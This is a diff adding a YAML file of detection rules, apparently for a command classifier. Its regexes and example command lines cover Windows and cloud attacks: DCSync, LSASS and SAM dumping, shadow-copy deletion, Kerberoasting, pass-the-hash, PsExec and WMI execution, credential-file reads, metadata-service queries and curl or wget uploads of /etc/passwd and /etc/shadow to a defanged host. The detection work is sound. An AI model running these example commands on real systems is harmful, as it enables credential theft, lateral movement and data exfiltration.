@@ -1,0 +1,372 @@
+# Windows, Active Directory and cloud: credential dumping, Kerberos roasting, lateral movement, recovery inhibition,
+# credential files, the cloud metadata service, sudo rights and HTTP exfiltration. This file comes before
+# 10-transfer-exec, so an upload with curl -T is exfiltration rather than a download, and before the generic readers.
+# The DCSync and dump rules come before lsass-dump, which also takes Invoke-Mimikatz's default credential dump.
+#
+# A rule that needs two things in one command reads them with two lookaheads from the command's start, each scanning
+# only that command ({seg}), so no scan nests in another. Placeholders such as {stage}, {seg}, {word} and {end} are
+# described in rules.py.
+
+- id: dcsync
+  match:
+    regex: '(?i){stage}(?:(?:secretsdump(?:\.py)?|impacket-secretsdump){end}(?!{seg}*?[^\S\n](?:local|-sam|-ntds){end})|mimikatz(?:\.exe)?{end}(?={seg}*?lsadump::dcsync))|(?<![\w:])lsadump::dcsync(?![\w])'
+  meaning: Replicates password hashes from a domain controller as if it were another one (DCSync), with secretsdump or Mimikatz.
+  techniques: [T1003.006]
+  artifacts: [Active Directory Credential]
+  iocs: [ipv4, domain, user]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "secretsdump.py -just-dc corp/admin@10.0.0[.]5"
+      - "impacket-secretsdump -hashes :8846f7eaee8fb117ad06bdd830b7586c corp/admin@dc01"
+      - 'mimikatz "lsadump::dcsync /domain:corp /user:krbtgt" exit'
+      - "Invoke-Mimikatz -Command '\"lsadump::dcsync /user:krbtgt\"'"
+    no_match:
+      - "secretsdump.py -system SYSTEM -security SECURITY LOCAL"
+      - "pip install impacket"
+
+# The AD database: ntdsutil's install-from-media copy, ntds.dit copied (from a shadow copy) or read by secretsdump
+# offline.
+- id: ntds-dump
+  match:
+    regex: '(?i){stage}(?:ntdsutil(?:\.exe)?{end}(?={seg}*?[^\S\n]["\x27]?ifm(?:["\x27]|{end}))|(?:copy|cp|xcopy|robocopy|esentutl)(?:\.exe)?{end}(?={seg}*?ntds\.dit(?![\w.-]))|(?:secretsdump(?:\.py)?|impacket-secretsdump){end}(?={seg}*?[^\S\n]-ntds{end}))'
+  meaning: Copies the Active Directory database (ntds.dit), which holds every domain account's password hash.
+  techniques: [T1003.003]
+  artifacts: [Active Directory Credential, File]
+  iocs: [path]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - 'ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q'
+      - 'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp'
+      - "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL"
+    no_match:
+      - 'ntdsutil "help"'
+      - 'dir C:\Windows\NTDS'
+
+# The SAM, SYSTEM and SECURITY hives saved with reg save, read by secretsdump offline, or dumped by Mimikatz.
+- id: sam-dump
+  match:
+    regex: '(?i){stage}(?:reg(?:\.exe)?{end}[^\S\n]+save[^\S\n]+["\x27]?(?:hklm|hkey_local_machine)\\(?:sam|system|security){end}|(?:secretsdump(?:\.py)?|impacket-secretsdump){end}(?={seg}*?[^\S\n]-sam{end})|mimikatz(?:\.exe)?{end}(?={seg}*?lsadump::sam))|(?<![\w:])lsadump::sam(?![\w])'
+  meaning: Saves or reads the Windows SAM and SYSTEM registry hives, which hold local account password hashes.
+  techniques: [T1003.002]
+  artifacts: [Windows Registry, File]
+  iocs: [path]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - 'reg save HKLM\SAM C:\Temp\SAM'
+      - 'reg.exe save hklm\system SYSTEM'
+      - "secretsdump.py -sam SAM -system SYSTEM LOCAL"
+      - 'mimikatz "lsadump::sam" exit'
+    no_match:
+      - 'reg query HKLM\SAM'
+      - 'reg save HKCU\Software\x x-hive'
+
+# LSASS memory: comsvcs.dll's MiniDump export (also by ordinal 24) through rundll32, procdump -ma on lsass, and
+# Mimikatz's sekurlsa module or Invoke-Mimikatz's default credential dump.
+- id: lsass-dump
+  match:
+    regex: '(?i){stage}(?:rundll32(?:\.exe)?{end}(?={seg}*?comsvcs)(?={seg}*?(?:minidump|#\+?24){end})|(?:procdump|procdump64)(?:\.exe)?{end}(?={seg}*?[^\S\n]-ma{end})(?={seg}*?lsass)|mimikatz(?:\.exe)?{end}(?={seg}*?sekurlsa::)|invoke-mimikatz{end}|out-minidump{end}(?={seg}*?lsass))|(?<![\w:])sekurlsa::(?:logonpasswords|wdigest|msv|minidump|ekeys|tickets)(?![\w])'
+  meaning: Dumps the memory of LSASS, the Windows process that holds logged-on users' credentials.
+  techniques: [T1003.001]
+  artifacts: [Process, File]
+  iocs: [path]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\l.dmp full'
+      - "rundll32 comsvcs.dll #24 624 l.dmp full"
+      - "procdump64.exe -accepteula -ma lsass.exe l.dmp"
+      - 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
+      - "Invoke-Mimikatz -DumpCreds"
+    no_match:
+      - "rundll32 shell32.dll,Control_RunDLL"
+      - "procdump -ma notepad.exe"
+      - "tasklist | findstr lsass"
+
+# Shadow copies and backups deleted, or Windows recovery turned off, as ransomware does before it encrypts.
+- id: shadow-copy-delete
+  match:
+    regex: '(?i){stage}(?:vssadmin(?:\.exe)?{end}(?={seg}*?[^\S\n](?:delete[^\S\n]+shadows|resize[^\S\n]+shadowstorage){end})|wmic(?:\.exe)?{end}(?={seg}*?shadowcopy)(?={seg}*?[^\S\n]delete{end})|wbadmin(?:\.exe)?{end}(?={seg}*?[^\S\n]delete[^\S\n]+(?:catalog|systemstatebackup|backup){end})|bcdedit(?:\.exe)?{end}[^|;&\n]*?(?:recoveryenabled[^\S\n]+(?:no|off)|bootstatuspolicy[^\S\n]+ignoreallfailures){end})|win32_shadowcopy(?:(?!win32_shadowcopy).)*?(?:\.delete\(|remove-(?:wmi|cim)object)'
+  meaning: Deletes shadow copies or backups, or turns off Windows recovery, so the system cannot be restored.
+  techniques: [T1490]
+  artifacts: [Volume Shadow Copy]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "vssadmin delete shadows /all /quiet"
+      - "vssadmin.exe Delete Shadows /All /Quiet"
+      - "wmic shadowcopy delete"
+      - "wbadmin delete catalog -quiet"
+      - "bcdedit /set {default} recoveryenabled No"
+      - "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}"
+    no_match:
+      - "vssadmin list shadows"
+      - "wmic shadowcopy list"
+      - "bcdedit /enum"
+
+- id: kerberoast
+  match:
+    regex: '(?i){stage}(?:(?:getuserspns(?:\.py)?|impacket-getuserspns){end}|rubeus(?:\.exe)?{end}[^\S\n]+kerberoast{end}|invoke-kerberoast{end})'
+  meaning: Requests Kerberos service tickets for accounts with a service principal name, to crack their passwords offline (Kerberoasting).
+  techniques: [T1558.003]
+  artifacts: [Active Directory Credential]
+  iocs: [ipv4, domain, user]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "GetUserSPNs.py corp/jdoe -dc-ip 10.0.0[.]5 -request"
+      - "impacket-GetUserSPNs -request corp/jdoe"
+      - "Rubeus.exe kerberoast /outfile:h.txt"
+      - "Invoke-Kerberoast -OutputFormat Hashcat"
+    no_match:
+      - "Rubeus.exe asreproast"
+      - "setspn -L svc"
+
+- id: asreproast
+  match:
+    regex: '(?i){stage}(?:(?:getnpusers(?:\.py)?|impacket-getnpusers){end}|rubeus(?:\.exe)?{end}[^\S\n]+asreproast{end}|invoke-asreproast{end})'
+  meaning: Requests Kerberos replies for accounts that need no pre-authentication, to crack their passwords offline (AS-REP roasting).
+  techniques: [T1558.004]
+  artifacts: [Active Directory Credential]
+  iocs: [ipv4, domain, user]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "GetNPUsers.py corp/ -usersfile u.txt -no-pass"
+      - "Rubeus.exe asreproast /format:hashcat"
+      - "impacket-GetNPUsers corp/ -request"
+    no_match:
+      - "Rubeus.exe kerberoast"
+      - "cat GetNPUsers.txt"
+
+# Windows Remote Management with an NT hash (-H, --hash) instead of a password. The hash option is case-sensitive:
+# evil-winrm -h is help.
+- id: evil-winrm-pth
+  match:
+    regex: '(?i){stage}evil-winrm{end}(?={seg}*?[^\S\n](?-i:-H|--hash){end})'
+  meaning: Opens a remote PowerShell session over WinRM with an NT password hash instead of a password (pass the hash).
+  techniques: [T1550.002, T1021.006]
+  artifacts: [Network Connection, User Account]
+  iocs: [ipv4, domain, user]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "evil-winrm -i 10.0.0[.]5 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c"
+      - "evil-winrm -u admin --hash 8846f7eaee8fb117ad06bdd830b7586c -i dc01"
+    no_match:
+      - "evil-winrm -i 10.0.0[.]5 -u admin -p x"
+      - "evil-winrm -h"
+
+- id: winrm-remote
+  match:
+    regex: '(?i){stage}(?:evil-winrm{end}(?={seg}*?[^\S\n](?-i:-i){end})|winrs(?:\.exe)?{end}(?={seg}*?[^\S\n][-/]r(?::|{end}))|(?:enter-pssession|new-pssession|invoke-command|icm){end}(?={seg}*?[^\S\n]-(?:computername|cn){end}))'
+  meaning: Runs commands on another host over Windows Remote Management (evil-winrm, PowerShell remoting or winrs).
+  techniques: [T1021.006]
+  artifacts: [Network Connection]
+  iocs: [ipv4, domain, user]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "evil-winrm -i 10.0.0[.]5 -u admin -p x"
+      - "Enter-PSSession -ComputerName dc01"
+      - "Invoke-Command -ComputerName dc01 -ScriptBlock {whoami}"
+      - "winrs -r:dc01 cmd"
+    no_match:
+      - "Invoke-Command -ScriptBlock {whoami}"
+      - "evil-winrm -h"
+
+# CrackMapExec and NetExec. With an NT hash (-H, case-sensitive) it is pass the hash; with a password or password list
+# (-p) it is password spraying or credential checking.
+- id: netexec-pth
+  match:
+    regex: '(?i){stage}(?:crackmapexec|cme|netexec|nxc)(?:\.exe)?{end}(?={seg}*?[^\S\n](?-i:-H){end})'
+  meaning: Authenticates to hosts over SMB, WinRM or another protocol with an NT password hash instead of a password (pass the hash).
+  techniques: [T1550.002]
+  artifacts: [Network Connection, User Account]
+  iocs: [ipv4, domain, user]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "nxc smb 10.0.0[.]0/24 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c"
+      - "crackmapexec winrm dc01 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c -x whoami"
+    no_match:
+      - "nxc smb dc01 -u admin -p x"
+      - "nxc --help"
+
+- id: netexec-auth
+  match:
+    regex: '(?i){stage}(?:crackmapexec|cme|netexec|nxc)(?:\.exe)?{end}(?={seg}*?[^\S\n](?-i:-p){end})'
+  meaning: Tries a password or a list of passwords against hosts over SMB, WinRM, LDAP or another protocol (password spraying or checking stolen credentials).
+  techniques: [T1110.003]
+  artifacts: [Network Connection, User Account]
+  iocs: [ipv4, domain, user]
+  confidence: medium
+  platforms: [windows]
+  examples:
+    match:
+      - "crackmapexec smb 10.0.0[.]0/24 -u users.txt -p x"
+      - "nxc winrm dc01 -u admin -p pass --continue-on-success"
+    no_match:
+      - "nxc smb 10.0.0[.]0/24"
+      - "nxc --version"
+
+# Remote execution through a service created over SMB: Impacket's psexec and smbexec, and Sysinternals PsExec on a
+# \\host.
+- id: smb-exec
+  match:
+    regex: '(?i){stage}(?:(?:psexec|smbexec)\.py{end}|impacket-(?:psexec|smbexec){end}|(?:psexec|psexec64)(?:\.exe)?{end}(?={seg}*?[^\S\n]["\x27]?\\\\))'
+  meaning: Runs a command on another host by creating a service over SMB (PsExec or Impacket's psexec and smbexec).
+  techniques: [T1021.002, T1569.002]
+  artifacts: [Network Connection, Service]
+  iocs: [ipv4, domain, user]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "psexec.py corp/admin@10.0.0[.]5"
+      - "impacket-smbexec corp/admin@dc01"
+      - 'PsExec64.exe \\dc01 -s cmd.exe'
+      - 'psexec -accepteula \\10.0.0[.]5 -u admin cmd'
+    no_match:
+      - "psexec -h"
+      - "pip install psexec"
+
+- id: wmi-exec
+  match:
+    regex: '(?i){stage}(?:wmiexec\.py{end}|impacket-wmiexec{end}|wmic(?:\.exe)?{end}(?={seg}*?[^\S\n]/node:)(?={seg}*?[^\S\n]process[^\S\n]+call[^\S\n]+create{end})|(?:invoke-wmimethod|invoke-cimmethod){end}(?={seg}*?win32_process)(?={seg}*?create))'
+  meaning: Runs a command on a host through Windows Management Instrumentation (WMI), often a remote one.
+  techniques: [T1047]
+  artifacts: [Process, Network Connection]
+  iocs: [ipv4, domain, user]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "wmiexec.py corp/admin@10.0.0[.]5"
+      - "impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp/admin@dc01"
+      - 'wmic /node:10.0.0[.]5 process call create "cmd.exe /c whoami"'
+      - "Invoke-WmiMethod -ComputerName dc01 -Class Win32_Process -Name Create -ArgumentList calc.exe"
+    no_match:
+      - "wmic process list"
+      - "wmic /node:dc01 os get caption"
+
+# Active Directory collection for BloodHound: users, groups, sessions, ACLs and trusts in one sweep.
+- id: ad-collection
+  match:
+    regex: '(?i){stage}(?:bloodhound-python|bloodhound-ce-python|rusthound(?:-ce)?|sharphound(?:\.exe|\.ps1)?|invoke-bloodhound){end}'
+  meaning: Collects Active Directory users, groups, sessions and permissions for BloodHound, to map paths to domain admin.
+  techniques: [T1087.002, T1069.002]
+  artifacts: [Active Directory Object]
+  iocs: [ipv4, domain, user]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "bloodhound-python -d corp -u jdoe -p x -c All"
+      - '.\SharpHound.exe -c All --zipfilename o.zip'
+      - "Invoke-BloodHound -CollectionMethod All"
+    no_match:
+      - "cat bloodhound.zip"
+      - "pip install bloodhound"
+
+# Files that hold credentials in plain text or as tokens: cloud CLI credentials (AWS, Azure, Google Cloud), container
+# and cluster configs, git and netrc credentials, database client files, and application secrets (.env, wp-config).
+# Only commands that print or copy them count; an editor opening one is left to the model.
+- id: credential-files
+  match:
+    regex: '(?i){stage}(?:cat|less|more|head|tail|cp|scp|strings|grep|egrep|type|get-content|gc|copy|base64|xxd)(?:\.exe)?{end}(?={seg}*?(?:\.aws[/\\](?:credentials|config)|\.git-credentials|\.netrc|\.pgpass|\.my\.cnf|\.s3cfg|\.boto|\.docker[/\\]config\.json|\.kube[/\\]config|\.azure[/\\](?:accesstokens\.json|msal_token_cache\.(?:json|bin))|gcloud[/\\](?:credentials\.db|access_tokens\.db|application_default_credentials\.json|legacy_credentials)|wp-config\.php|(?<![\w.-])\.env)(?![\w.-]))'
+  meaning: Reads or copies a file that stores credentials, such as cloud access keys, a Kubernetes config or an application's .env secrets.
+  techniques: [T1552.001]
+  artifacts: [Credential, File]
+  iocs: [path]
+  confidence: high
+  examples:
+    match:
+      - "cat ~/.aws/credentials"
+      - 'type C:\Users\admin\.aws\credentials'
+      - "cat /root/.git-credentials"
+      - "cp ~/.kube/config /tmp/k"
+      - "cat /var/www/html/.env"
+      - 'Get-Content $env:USERPROFILE\.azure\msal_token_cache.json'
+    no_match:
+      - "ls ~/.aws"
+      - "aws configure list"
+      - "cat .env.example"
+      - "nano ~/.aws/credentials"
+
+# The instance metadata service of AWS, Azure and OpenStack (169.254.169.254), ECS task credentials (169.254.170.2)
+# and Google Cloud (metadata.google.internal), in stored (defanged) or plain form, anywhere on the line.
+- id: cloud-metadata
+  match:
+    regex: '(?i)(?<![\w.])169(?:\.|\[\.\])254(?:\.|\[\.\])(?:169(?:\.|\[\.\])254|170(?:\.|\[\.\])2)(?![\w.]|\[\.\])|(?<![\w.-])metadata(?:\.|\[\.\])google(?:\.|\[\.\])internal(?![\w.-])'
+  meaning: Queries the cloud instance metadata service, often for the instance's temporary cloud credentials.
+  techniques: [T1552.005]
+  artifacts: [Cloud Service, Credential]
+  iocs: [url]
+  confidence: medium
+  examples:
+    match:
+      - "curl -s hxxp://169.254.169[.]254/latest/meta-data/iam/security-credentials/"
+      - "curl -H 'Metadata-Flavor: Google' hxxp://metadata.google[.]internal/computeMetadata/v1/instance/service-accounts/default/token"
+      - "curl hxxp://169.254.170[.]2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+    no_match:
+      - "ping 169.254.1[.]1"
+      - "curl hxxp://203.0.113[.]5/x"
+
+# sudo -l lists the commands the user may run as root: the first look at a sudo rule to abuse. The l is
+# case-sensitive (sudo -L is another option on old versions).
+- id: sudo-list
+  match:
+    regex: '{line}sudo(?:[^\S\n]+-[A-Za-z]*){0,4}?[^\S\n]+-[A-KM-Za-z]*l[A-Za-z]*{end}'
+  meaning: Lists the commands the current user may run with sudo, a common first step to escalate privileges.
+  techniques: [T1548.003]
+  artifacts: [User Account]
+  confidence: medium
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "sudo -l"
+      - "sudo -n -l"
+      - "sudo -ll"
+      - "sudo -l -U www-data"
+    no_match:
+      - "sudo ls -l /root"
+      - "sudo -u bob id"
+      - "sudo -i"
+
+# A local file sent to a web server: curl -T, --upload-file, a form field or data read from a file (=@ or @), wget
+# --post-file, Invoke-WebRequest or Invoke-RestMethod with -InFile or a -Body read from a file, and WebClient's
+# Upload methods. Case-sensitive curl options: -t is a telnet option and -f is --fail.
+- id: http-upload
+  match:
+    regex: '(?i){stage}(?:curl(?:\.exe)?{end}(?={seg}*?[^\S\n](?:(?-i:-T)|--upload-file|(?-i:-F)[^\S\n]*["\x27]?[\w.-]+=@|--form[^\S\n]+["\x27]?[\w.-]+=@|--data-binary[^\S\n]+["\x27]?@|(?-i:-d)[^\S\n]*["\x27]?@|--data(?:-raw|-urlencode)?[^\S\n]+["\x27]?@))|wget{end}(?={seg}*?[^\S\n]--post-file(?:=|[^\S\n]))|(?:invoke-webrequest|iwr|invoke-restmethod|irm){end}(?={seg}*?[^\S\n]-infile{end}))|(?<![\w-])-body[^\S\n]+\(?[^\S\n]*(?:get-content|gc|\[(?:system\.)?io\.file\]::readall(?:bytes|text))(?![\w-])|\.upload(?:file|data|string|values)(?:async)?\('
+  meaning: Uploads a local file or its contents to a remote web server, often to take data off the host.
+  techniques: [T1048]
+  artifacts: [File, Network Connection]
+  iocs: [url, ipv4, domain, path]
+  confidence: medium
+  examples:
+    match:
+      - "curl -T /etc/passwd hxxp://203.0.113[.]5:8000/"
+      - "curl -F 'file=@/tmp/d.tgz' hxxp://203.0.113[.]5/up"
+      - "curl --data-binary @/tmp/d.tgz hxxp://203.0.113[.]5/"
+      - "wget --post-file=/etc/shadow hxxp://203.0.113[.]5/"
+      - 'Invoke-WebRequest -Uri hxxp://203.0.113[.]5/u -Method POST -InFile C:\temp\d.zip'
+      - 'Invoke-RestMethod -Uri hxxp://203.0.113[.]5/u -Method Post -Body (Get-Content C:\temp\d.txt)'
+      - "(New-Object Net.WebClient).UploadFile('hxxp://203.0.113[.]5/u', 'd.zip')"
+    no_match:
+      - "curl -s hxxp://203.0.113[.]5/x -o x"
+      - "curl -d 'user=a' hxxp://203.0.113[.]5/login"
+      - "Invoke-WebRequest -Uri hxxp://203.0.113[.]5/x -OutFile x"
